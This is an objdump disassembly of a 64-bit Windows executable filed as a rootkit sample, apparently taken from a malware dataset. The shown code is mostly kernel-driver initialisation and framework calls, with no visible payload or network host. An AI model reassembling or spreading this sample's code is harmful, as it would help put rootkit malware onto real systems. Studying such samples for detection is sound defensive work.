
malware_samples/rootkit/f83c357106a7d1d055b5cb75c8414aa3219354deb16ae9ee7efe8ee4c8c670ca.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 0d b5 a7 00 00 	lea    0xa7b5(%rip),%rcx        # 0x14000b7c0
   14000100b:	e8 c0 01 00 00       	call   0x1400011d0
   140001010:	4c 8b 05 e1 38 01 00 	mov    0x138e1(%rip),%r8        # 0x1400148f8
   140001017:	48 8d 15 a2 a7 00 00 	lea    0xa7a2(%rip),%rdx        # 0x14000b7c0
   14000101e:	48 8d 0d b3 38 01 00 	lea    0x138b3(%rip),%rcx        # 0x1400148d8
   140001025:	48 83 c4 28          	add    $0x28,%rsp
   140001029:	e9 12 61 00 00       	jmp    0x140007140
   14000102e:	cc                   	int3
   14000102f:	cc                   	int3
   140001030:	e9 cb ff ff ff       	jmp    0x140001000
   140001035:	cc                   	int3
   140001036:	cc                   	int3
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 83 ec 28          	sub    $0x28,%rsp
   140001044:	48 8b 05 9d 38 01 00 	mov    0x1389d(%rip),%rax        # 0x1400148e8
   14000104b:	48 85 c0             	test   %rax,%rax
   14000104e:	74 0e                	je     0x14000105e
   140001050:	48 8d 15 e9 ff ff ff 	lea    -0x17(%rip),%rdx        # 0x140001040
   140001057:	48 3b c2             	cmp    %rdx,%rax
   14000105a:	74 02                	je     0x14000105e
   14000105c:	ff d0                	call   *%rax
   14000105e:	48 83 c4 28          	add    $0x28,%rsp
   140001062:	e9 99 ff ff ff       	jmp    0x140001000
   140001067:	cc                   	int3
   140001068:	cc                   	int3
   140001069:	cc                   	int3
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001075:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000107a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000107f:	57                   	push   %rdi
   140001080:	48 83 ec 20          	sub    $0x20,%rsp
   140001084:	33 ed                	xor    %ebp,%ebp
   140001086:	48 8b f2             	mov    %rdx,%rsi
   140001089:	48 8b f9             	mov    %rcx,%rdi
   14000108c:	48 3b cd             	cmp    %rbp,%rcx
   14000108f:	75 0c                	jne    0x14000109d
   140001091:	33 c9                	xor    %ecx,%ecx
   140001093:	e8 b8 14 00 00       	call   0x140002550
   140001098:	e9 e0 00 00 00       	jmp    0x14000117d
   14000109d:	b8 08 02 00 00       	mov    $0x208,%eax
   1400010a2:	48 89 0d 57 38 01 00 	mov    %rcx,0x13857(%rip)        # 0x140014900
   1400010a9:	48 8d 0d 28 38 01 00 	lea    0x13828(%rip),%rcx        # 0x1400148d8
   1400010b0:	66 89 05 23 38 01 00 	mov    %ax,0x13823(%rip)        # 0x1400148da
   1400010b7:	48 8d 05 52 38 01 00 	lea    0x13852(%rip),%rax        # 0x140014910
   1400010be:	66 89 2d 13 38 01 00 	mov    %bp,0x13813(%rip)        # 0x1400148d8
   1400010c5:	48 89 05 14 38 01 00 	mov    %rax,0x13814(%rip)        # 0x1400148e0
   1400010cc:	ff 15 66 72 00 00    	call   *0x7266(%rip)        # 0x140008338
   1400010d2:	4c 8d 0d 1f 38 01 00 	lea    0x1381f(%rip),%r9        # 0x1400148f8
   1400010d9:	4c 8d 05 e0 a6 00 00 	lea    0xa6e0(%rip),%r8        # 0x14000b7c0
   1400010e0:	48 8d 15 f1 37 01 00 	lea    0x137f1(%rip),%rdx        # 0x1400148d8
   1400010e7:	48 8b cf             	mov    %rdi,%rcx
   1400010ea:	e8 61 60 00 00       	call   0x140007150
   1400010ef:	3b c5                	cmp    %ebp,%eax
   1400010f1:	0f 8c 86 00 00 00    	jl     0x14000117d
   1400010f7:	48 8d 0d c2 a6 00 00 	lea    0xa6c2(%rip),%rcx        # 0x14000b7c0
   1400010fe:	e8 4d 01 00 00       	call   0x140001250
   140001103:	3b c5                	cmp    %ebp,%eax
   140001105:	8b d8                	mov    %eax,%ebx
   140001107:	7c 6d                	jl     0x140001176
   140001109:	e8 d2 01 00 00       	call   0x1400012e0
   14000110e:	48 8b d6             	mov    %rsi,%rdx
   140001111:	48 8b cf             	mov    %rdi,%rcx
   140001114:	e8 37 14 00 00       	call   0x140002550
   140001119:	3b c5                	cmp    %ebp,%eax
   14000111b:	8b d8                	mov    %eax,%ebx
   14000111d:	7c 57                	jl     0x140001176
   14000111f:	48 8b 05 d2 37 01 00 	mov    0x137d2(%rip),%rax        # 0x1400148f8
   140001126:	40 38 68 30          	cmp    %bpl,0x30(%rax)
   14000112a:	74 24                	je     0x140001150
   14000112c:	48 8b 05 b5 37 01 00 	mov    0x137b5(%rip),%rax        # 0x1400148e8
   140001133:	48 39 6f 68          	cmp    %rbp,0x68(%rdi)
   140001137:	48 0f 45 47 68       	cmovne 0x68(%rdi),%rax
   14000113c:	48 89 05 a5 37 01 00 	mov    %rax,0x137a5(%rip)        # 0x1400148e8
   140001143:	48 8d 05 f6 fe ff ff 	lea    -0x10a(%rip),%rax        # 0x140001040
   14000114a:	48 89 47 68          	mov    %rax,0x68(%rdi)
   14000114e:	eb 22                	jmp    0x140001172
   140001150:	f6 40 08 02          	testb  $0x2,0x8(%rax)
   140001154:	74 1c                	je     0x140001172
   140001156:	48 8b 05 5b 31 01 00 	mov    0x1315b(%rip),%rax        # 0x1400142b8
   14000115d:	48 89 05 8c 37 01 00 	mov    %rax,0x1378c(%rip)        # 0x1400148f0
   140001164:	48 8d 05 c5 fe ff ff 	lea    -0x13b(%rip),%rax        # 0x140001030
   14000116b:	48 89 05 46 31 01 00 	mov    %rax,0x13146(%rip)        # 0x1400142b8
   140001172:	33 c0                	xor    %eax,%eax
   140001174:	eb 07                	jmp    0x14000117d
   140001176:	e8 85 fe ff ff       	call   0x140001000
   14000117b:	8b c3                	mov    %ebx,%eax
   14000117d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001182:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001187:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000118c:	48 83 c4 20          	add    $0x20,%rsp
   140001190:	5f                   	pop    %rdi
   140001191:	c3                   	ret
   140001192:	cc                   	int3
   140001193:	cc                   	int3
   140001194:	cc                   	int3
   140001195:	cc                   	int3
   140001196:	cc                   	int3
   140001197:	cc                   	int3
   140001198:	cc                   	int3
   140001199:	cc                   	int3
   14000119a:	cc                   	int3
   14000119b:	cc                   	int3
   14000119c:	cc                   	int3
   14000119d:	cc                   	int3
   14000119e:	cc                   	int3
   14000119f:	cc                   	int3
   1400011a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400011a5:	57                   	push   %rdi
   1400011a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011aa:	48 8b da             	mov    %rdx,%rbx
   1400011ad:	48 8b f9             	mov    %rcx,%rdi
   1400011b0:	e8 4b 4e 01 00       	call   0x140016000
   1400011b5:	48 8b d3             	mov    %rbx,%rdx
   1400011b8:	48 8b cf             	mov    %rdi,%rcx
   1400011bb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400011c0:	48 83 c4 20          	add    $0x20,%rsp
   1400011c4:	5f                   	pop    %rdi
   1400011c5:	e9 a6 fe ff ff       	jmp    0x140001070
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400011d5:	57                   	push   %rdi
   1400011d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011da:	48 8b 05 27 a6 00 00 	mov    0xa627(%rip),%rax        # 0x14000b808
   1400011e1:	48 8b f9             	mov    %rcx,%rdi
   1400011e4:	48 8d 0d 05 a6 00 00 	lea    0xa605(%rip),%rcx        # 0x14000b7f0
   1400011eb:	48 8d 1d 0e a6 00 00 	lea    0xa60e(%rip),%rbx        # 0x14000b800
   1400011f2:	48 3b c1             	cmp    %rcx,%rax
   1400011f5:	74 45                	je     0x14000123c
   1400011f7:	48 3b d8             	cmp    %rax,%rbx
   1400011fa:	77 40                	ja     0x14000123c
   1400011fc:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140001200:	48 85 c0             	test   %rax,%rax
   140001203:	74 18                	je     0x14000121d
   140001205:	4c 8b 05 ec 36 01 00 	mov    0x136ec(%rip),%r8        # 0x1400148f8
   14000120c:	48 8d 0d 5d 5f 00 00 	lea    0x5f5d(%rip),%rcx        # 0x140007170
   140001213:	4c 8b cb             	mov    %rbx,%r9
   140001216:	48 8b d7             	mov    %rdi,%rdx
   140001219:	ff d0                	call   *%rax
   14000121b:	eb 12                	jmp    0x14000122f
   14000121d:	48 8b 15 d4 36 01 00 	mov    0x136d4(%rip),%rdx        # 0x1400148f8
   140001224:	4c 8b c3             	mov    %rbx,%r8
   140001227:	48 8b cf             	mov    %rdi,%rcx
   14000122a:	e8 41 5f 00 00       	call   0x140007170
   14000122f:	48 83 c3 50          	add    $0x50,%rbx
   140001233:	48 3b 1d ce a5 00 00 	cmp    0xa5ce(%rip),%rbx        # 0x14000b808
   14000123a:	76 c0                	jbe    0x1400011fc
   14000123c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001241:	48 83 c4 20          	add    $0x20,%rsp
   140001245:	5f                   	pop    %rdi
   140001246:	c3                   	ret
   140001247:	cc                   	int3
   140001248:	cc                   	int3
   140001249:	cc                   	int3
   14000124a:	cc                   	int3
   14000124b:	cc                   	int3
   14000124c:	cc                   	int3
   14000124d:	cc                   	int3
   14000124e:	cc                   	int3
   14000124f:	cc                   	int3
   140001250:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001255:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000125a:	57                   	push   %rdi
   14000125b:	48 83 ec 20          	sub    $0x20,%rsp
   14000125f:	48 8b f9             	mov    %rcx,%rdi
   140001262:	33 c0                	xor    %eax,%eax
   140001264:	48 8d 1d 95 a5 00 00 	lea    0xa595(%rip),%rbx        # 0x14000b800
   14000126b:	48 8d 35 8e a5 00 00 	lea    0xa58e(%rip),%rsi        # 0x14000b800
   140001272:	48 3b de             	cmp    %rsi,%rbx
   140001275:	73 4e                	jae    0x1400012c5
   140001277:	83 3b 50             	cmpl   $0x50,(%rbx)
   14000127a:	75 44                	jne    0x1400012c0
   14000127c:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140001280:	48 89 1d 81 a5 00 00 	mov    %rbx,0xa581(%rip)        # 0x14000b808
   140001287:	48 85 c0             	test   %rax,%rax
   14000128a:	74 18                	je     0x1400012a4
   14000128c:	4c 8b 05 65 36 01 00 	mov    0x13665(%rip),%r8        # 0x1400148f8
   140001293:	48 8d 0d c6 5e 00 00 	lea    0x5ec6(%rip),%rcx        # 0x140007160
   14000129a:	4c 8b cb             	mov    %rbx,%r9
   14000129d:	48 8b d7             	mov    %rdi,%rdx
   1400012a0:	ff d0                	call   *%rax
   1400012a2:	eb 12                	jmp    0x1400012b6
   1400012a4:	48 8b 15 4d 36 01 00 	mov    0x1364d(%rip),%rdx        # 0x1400148f8
   1400012ab:	4c 8b c3             	mov    %rbx,%r8
   1400012ae:	48 8b cf             	mov    %rdi,%rcx
   1400012b1:	e8 aa 5e 00 00       	call   0x140007160
   1400012b6:	85 c0                	test   %eax,%eax
   1400012b8:	78 0b                	js     0x1400012c5
   1400012ba:	48 83 c3 50          	add    $0x50,%rbx
   1400012be:	eb b2                	jmp    0x140001272
   1400012c0:	b8 04 00 00 c0       	mov    $0xc0000004,%eax
   1400012c5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400012ca:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400012cf:	48 83 c4 20          	add    $0x20,%rsp
   1400012d3:	5f                   	pop    %rdi
   1400012d4:	c3                   	ret
   1400012d5:	cc                   	int3
   1400012d6:	cc                   	int3
   1400012d7:	cc                   	int3
   1400012d8:	cc                   	int3
   1400012d9:	cc                   	int3
   1400012da:	cc                   	int3
   1400012db:	cc                   	int3
   1400012dc:	cc                   	int3
   1400012dd:	cc                   	int3
   1400012de:	cc                   	int3
   1400012df:	cc                   	int3
   1400012e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400012e5:	57                   	push   %rdi
   1400012e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400012ea:	48 8d 05 2f a5 00 00 	lea    0xa52f(%rip),%rax        # 0x14000b820
   1400012f1:	48 8d 0d 28 a5 00 00 	lea    0xa528(%rip),%rcx        # 0x14000b820
   1400012f8:	48 3b c1             	cmp    %rcx,%rax
   1400012fb:	73 3c                	jae    0x140001339
   1400012fd:	48 2b c8             	sub    %rax,%rcx
   140001300:	48 b8 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rax
   140001307:	cc cc cc 
   14000130a:	48 8d 1d 2f a5 00 00 	lea    0xa52f(%rip),%rbx        # 0x14000b840
   140001311:	48 ff c9             	dec    %rcx
   140001314:	48 f7 e1             	mul    %rcx
   140001317:	48 8b fa             	mov    %rdx,%rdi
   14000131a:	48 c1 ef 05          	shr    $0x5,%rdi
   14000131e:	48 ff c7             	inc    %rdi
   140001321:	48 8b 03             	mov    (%rbx),%rax
   140001324:	48 85 c0             	test   %rax,%rax
   140001327:	74 06                	je     0x14000132f
   140001329:	ff d0                	call   *%rax
   14000132b:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   14000132f:	48 83 c3 28          	add    $0x28,%rbx
   140001333:	48 83 ef 01          	sub    $0x1,%rdi
   140001337:	75 e8                	jne    0x140001321
   140001339:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000133e:	48 83 c4 20          	add    $0x20,%rsp
   140001342:	5f                   	pop    %rdi
   140001343:	c3                   	ret
   140001344:	cc                   	int3
   140001345:	cc                   	int3
   140001346:	cc                   	int3
   140001347:	cc                   	int3
   140001348:	cc                   	int3
   140001349:	cc                   	int3
   14000134a:	cc                   	int3
   14000134b:	cc                   	int3
   14000134c:	cc                   	int3
   14000134d:	cc                   	int3
   14000134e:	cc                   	int3
   14000134f:	cc                   	int3
   140001350:	40 55                	rex push %rbp
   140001352:	48 8d ac 24 b0 fb ff 	lea    -0x450(%rsp),%rbp
   140001359:	ff 
   14000135a:	48 81 ec 50 05 00 00 	sub    $0x550,%rsp
   140001361:	48 8b 05 48 a4 00 00 	mov    0xa448(%rip),%rax        # 0x14000b7b0
   140001368:	48 33 c4             	xor    %rsp,%rax
   14000136b:	48 89 85 40 04 00 00 	mov    %rax,0x440(%rbp)
   140001372:	33 d2                	xor    %edx,%edx
   140001374:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   140001378:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000137e:	e8 fd 60 00 00       	call   0x140007480
   140001383:	33 d2                	xor    %edx,%edx
   140001385:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000138a:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   140001390:	e8 eb 60 00 00       	call   0x140007480
   140001395:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001398:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   14000139c:	ba 00 04 00 00       	mov    $0x400,%edx
   1400013a1:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400013a6:	e8 bd 04 00 00       	call   0x140001868
   1400013ab:	84 c0                	test   %al,%al
   1400013ad:	74 6e                	je     0x14000141d
   1400013af:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   1400013b3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400013b8:	ff 15 8a 6f 00 00    	call   *0x6f8a(%rip)        # 0x140008348
   1400013be:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400013c3:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400013c8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400013cd:	e8 92 09 00 00       	call   0x140001d64
   1400013d2:	85 c0                	test   %eax,%eax
   1400013d4:	78 34                	js     0x14000140a
   1400013d6:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400013db:	48 85 c9             	test   %rcx,%rcx
   1400013de:	74 3d                	je     0x14000141d
   1400013e0:	8b 54 24 20          	mov    0x20(%rsp),%edx
   1400013e4:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400013e9:	e8 2e 13 00 00       	call   0x14000271c
   1400013ee:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400013f3:	ba 51 61 78 58       	mov    $0x58786151,%edx
   1400013f8:	ff 15 42 6f 00 00    	call   *0x6f42(%rip)        # 0x140008340
   1400013fe:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001403:	e8 e8 2d 00 00       	call   0x1400041f0
   140001408:	eb 15                	jmp    0x14000141f
   14000140a:	48 8d 15 7f 61 00 00 	lea    0x617f(%rip),%rdx        # 0x140007590
   140001411:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001416:	e8 75 5b 00 00       	call   0x140006f90
   14000141b:	eb e1                	jmp    0x1400013fe
   14000141d:	32 c0                	xor    %al,%al
   14000141f:	48 8b 8d 40 04 00 00 	mov    0x440(%rbp),%rcx
   140001426:	48 33 cc             	xor    %rsp,%rcx
   140001429:	e8 82 5c 00 00       	call   0x1400070b0
   14000142e:	48 81 c4 50 05 00 00 	add    $0x550,%rsp
   140001435:	5d                   	pop    %rbp
   140001436:	c3                   	ret
   140001437:	cc                   	int3
   140001438:	48 83 ec 28          	sub    $0x28,%rsp
   14000143c:	80 3d ed a3 00 00 00 	cmpb   $0x0,0xa3ed(%rip)        # 0x14000b830
   140001443:	74 04                	je     0x140001449
   140001445:	b0 01                	mov    $0x1,%al
   140001447:	eb 1a                	jmp    0x140001463
   140001449:	e8 56 03 00 00       	call   0x1400017a4
   14000144e:	84 c0                	test   %al,%al
   140001450:	74 0b                	je     0x14000145d
   140001452:	e8 51 00 00 00       	call   0x1400014a8
   140001457:	88 05 d3 a3 00 00    	mov    %al,0xa3d3(%rip)        # 0x14000b830
   14000145d:	8a 05 cd a3 00 00    	mov    0xa3cd(%rip),%al        # 0x14000b830
   140001463:	48 83 c4 28          	add    $0x28,%rsp
   140001467:	c3                   	ret
   140001468:	48 83 ec 38          	sub    $0x38,%rsp
   14000146c:	80 3d bd a3 00 00 00 	cmpb   $0x0,0xa3bd(%rip)        # 0x14000b830
   140001473:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001476:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000147b:	74 24                	je     0x1400014a1
   14000147d:	48 8b 15 b4 a3 00 00 	mov    0xa3b4(%rip),%rdx        # 0x14000b838
   140001484:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001489:	ff 15 b9 6e 00 00    	call   *0x6eb9(%rip)        # 0x140008348
   14000148f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001494:	ff 15 8e 6e 00 00    	call   *0x6e8e(%rip)        # 0x140008328
   14000149a:	c6 05 8f a3 00 00 00 	movb   $0x0,0xa38f(%rip)        # 0x14000b830
   1400014a1:	48 83 c4 38          	add    $0x38,%rsp
   1400014a5:	c3                   	ret
   1400014a6:	cc                   	int3
   1400014a7:	cc                   	int3
   1400014a8:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400014ad:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400014b2:	55                   	push   %rbp
   1400014b3:	48 8d 6c 24 f0       	lea    -0x10(%rsp),%rbp
   1400014b8:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   1400014bf:	48 8b 15 82 a3 00 00 	mov    0xa382(%rip),%rdx        # 0x14000b848
   1400014c6:	4c 8d 05 b3 6f 00 00 	lea    0x6fb3(%rip),%r8        # 0x140008480
   1400014cd:	48 8b 05 64 28 01 00 	mov    0x12864(%rip),%rax        # 0x140013d38
   1400014d4:	48 8b 0d 1d 34 01 00 	mov    0x1341d(%rip),%rcx        # 0x1400148f8
   1400014db:	ff 15 8f 6e 00 00    	call   *0x6e8f(%rip)        # 0x140008370
   1400014e1:	48 89 45 20          	mov    %rax,0x20(%rbp)
   1400014e5:	48 85 c0             	test   %rax,%rax
   1400014e8:	75 07                	jne    0x1400014f1
   1400014ea:	32 c0                	xor    %al,%al
   1400014ec:	e9 58 02 00 00       	jmp    0x140001749
   1400014f1:	48 8b 15 40 a3 00 00 	mov    0xa340(%rip),%rdx        # 0x14000b838
   1400014f8:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400014fc:	ff 15 46 6e 00 00    	call   *0x6e46(%rip)        # 0x140008348
   140001502:	48 8b 15 37 a3 00 00 	mov    0xa337(%rip),%rdx        # 0x14000b840
   140001509:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   14000150d:	ff 15 35 6e 00 00    	call   *0x6e35(%rip)        # 0x140008348
   140001513:	48 8b 05 3e 29 01 00 	mov    0x1293e(%rip),%rax        # 0x140013e58
   14000151a:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140001520:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001524:	48 8b 0d cd 33 01 00 	mov    0x133cd(%rip),%rcx        # 0x1400148f8
   14000152b:	ff 15 3f 6e 00 00    	call   *0x6e3f(%rip)        # 0x140008370
   140001531:	48 8b 05 48 29 01 00 	mov    0x12948(%rip),%rax        # 0x140013e80
   140001538:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   14000153e:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001542:	48 8b 0d af 33 01 00 	mov    0x133af(%rip),%rcx        # 0x1400148f8
   140001549:	ff 15 21 6e 00 00    	call   *0x6e21(%rip)        # 0x140008370
   14000154f:	48 8b 05 0a 29 01 00 	mov    0x1290a(%rip),%rax        # 0x140013e60
   140001556:	41 b0 01             	mov    $0x1,%r8b
   140001559:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   14000155d:	48 8b 0d 94 33 01 00 	mov    0x13394(%rip),%rcx        # 0x1400148f8
   140001564:	ff 15 06 6e 00 00    	call   *0x6e06(%rip)        # 0x140008370
   14000156a:	48 8b 05 17 29 01 00 	mov    0x12917(%rip),%rax        # 0x140013e88
   140001571:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   140001575:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001579:	48 8b 0d 78 33 01 00 	mov    0x13378(%rip),%rcx        # 0x1400148f8
   140001580:	ff 15 ea 6d 00 00    	call   *0x6dea(%rip)        # 0x140008370
   140001586:	85 c0                	test   %eax,%eax
   140001588:	79 1d                	jns    0x1400015a7
   14000158a:	48 8b 0d 67 33 01 00 	mov    0x13367(%rip),%rcx        # 0x1400148f8
   140001591:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001595:	48 8b 05 84 28 01 00 	mov    0x12884(%rip),%rax        # 0x140013e20
   14000159c:	ff 15 ce 6d 00 00    	call   *0x6dce(%rip)        # 0x140008370
   1400015a2:	e9 43 ff ff ff       	jmp    0x1400014ea
   1400015a7:	48 8d 05 a2 02 00 00 	lea    0x2a2(%rip),%rax        # 0x140001850
   1400015ae:	c7 44 24 68 28 00 00 	movl   $0x28,0x68(%rsp)
   1400015b5:	00 
   1400015b6:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400015bb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400015c0:	be 02 00 00 00       	mov    $0x2,%esi
   1400015c5:	c7 45 8c 04 00 00 00 	movl   $0x4,-0x74(%rbp)
   1400015cc:	48 8d 05 6d 02 00 00 	lea    0x26d(%rip),%rax        # 0x140001840
   1400015d3:	89 75 88             	mov    %esi,-0x78(%rbp)
   1400015d6:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1400015db:	33 d2                	xor    %edx,%edx
   1400015dd:	48 8d 05 5c 02 00 00 	lea    0x25c(%rip),%rax        # 0x140001840
   1400015e4:	44 8d 76 36          	lea    0x36(%rsi),%r14d
   1400015e8:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400015ec:	45 8b c6             	mov    %r14d,%r8d
   1400015ef:	e8 8c 5e 00 00       	call   0x140007480
   1400015f4:	48 8b 05 ad 28 01 00 	mov    0x128ad(%rip),%rax        # 0x140013ea8
   1400015fb:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140001600:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001604:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140001609:	48 8b 0d e8 32 01 00 	mov    0x132e8(%rip),%rcx        # 0x1400148f8
   140001610:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   140001615:	89 74 24 48          	mov    %esi,0x48(%rsp)
   140001619:	c7 44 24 4c 04 00 00 	movl   $0x4,0x4c(%rsp)
   140001620:	00 
   140001621:	ff 15 49 6d 00 00    	call   *0x6d49(%rip)        # 0x140008370
   140001627:	45 8b c6             	mov    %r14d,%r8d
   14000162a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000162f:	33 d2                	xor    %edx,%edx
   140001631:	e8 4a 5e 00 00       	call   0x140007480
   140001636:	48 8b 05 8b 28 01 00 	mov    0x1288b(%rip),%rax        # 0x140013ec8
   14000163d:	4c 8d 0d 0c a2 00 00 	lea    0xa20c(%rip),%r9        # 0x14000b850
   140001644:	48 8b 0d ad 32 01 00 	mov    0x132ad(%rip),%rcx        # 0x1400148f8
   14000164b:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140001650:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140001654:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   140001659:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   140001660:	00 
   140001661:	c7 44 24 4c 01 00 00 	movl   $0x1,0x4c(%rsp)
   140001668:	00 
   140001669:	ff 15 01 6d 00 00    	call   *0x6d01(%rip)        # 0x140008370
   14000166f:	85 c0                	test   %eax,%eax
   140001671:	0f 88 13 ff ff ff    	js     0x14000158a
   140001677:	33 d2                	xor    %edx,%edx
   140001679:	44 8d 46 56          	lea    0x56(%rsi),%r8d
   14000167d:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140001681:	e8 fa 5d 00 00       	call   0x140007480
   140001686:	83 4d 00 ff          	orl    $0xffffffff,0x0(%rbp)
   14000168a:	48 8d 05 cf 00 00 00 	lea    0xcf(%rip),%rax        # 0x140001760
   140001691:	48 83 65 c8 00       	andq   $0x0,-0x38(%rbp)
   140001696:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000169b:	48 83 65 d0 00       	andq   $0x0,-0x30(%rbp)
   1400016a0:	45 8b c6             	mov    %r14d,%r8d
   1400016a3:	33 d2                	xor    %edx,%edx
   1400016a5:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400016a9:	c7 45 b0 58 00 00 00 	movl   $0x58,-0x50(%rbp)
   1400016b0:	89 75 b8             	mov    %esi,-0x48(%rbp)
   1400016b3:	c6 45 bd 01          	movb   $0x1,-0x43(%rbp)
   1400016b7:	89 75 b4             	mov    %esi,-0x4c(%rbp)
   1400016ba:	e8 c1 5d 00 00       	call   0x140007480
   1400016bf:	48 8b 15 8a a1 00 00 	mov    0xa18a(%rip),%rdx        # 0x14000b850
   1400016c6:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   1400016ca:	48 8b 05 5f 2a 01 00 	mov    0x12a5f(%rip),%rax        # 0x140014130
   1400016d1:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400016d6:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400016db:	4c 8d 45 b0          	lea    -0x50(%rbp),%r8
   1400016df:	48 8b 0d 12 32 01 00 	mov    0x13212(%rip),%rcx        # 0x1400148f8
   1400016e6:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1400016eb:	89 74 24 48          	mov    %esi,0x48(%rsp)
   1400016ef:	c7 44 24 4c 04 00 00 	movl   $0x4,0x4c(%rsp)
   1400016f6:	00 
   1400016f7:	ff 15 73 6c 00 00    	call   *0x6c73(%rip)        # 0x140008370
   1400016fd:	48 8b 0d f4 31 01 00 	mov    0x131f4(%rip),%rcx        # 0x1400148f8
   140001704:	85 c0                	test   %eax,%eax
   140001706:	0f 88 85 fe ff ff    	js     0x140001591
   14000170c:	48 8b 15 3d a1 00 00 	mov    0xa13d(%rip),%rdx        # 0x14000b850
   140001713:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   140001717:	48 8b 05 d2 27 01 00 	mov    0x127d2(%rip),%rax        # 0x140013ef0
   14000171e:	ff 15 4c 6c 00 00    	call   *0x6c4c(%rip)        # 0x140008370
   140001724:	48 8b 0d cd 31 01 00 	mov    0x131cd(%rip),%rcx        # 0x1400148f8
   14000172b:	85 c0                	test   %eax,%eax
   14000172d:	0f 88 5e fe ff ff    	js     0x140001591
   140001733:	48 8b 05 0e 26 01 00 	mov    0x1260e(%rip),%rax        # 0x140013d48
   14000173a:	48 8b 15 0f a1 00 00 	mov    0xa10f(%rip),%rdx        # 0x14000b850
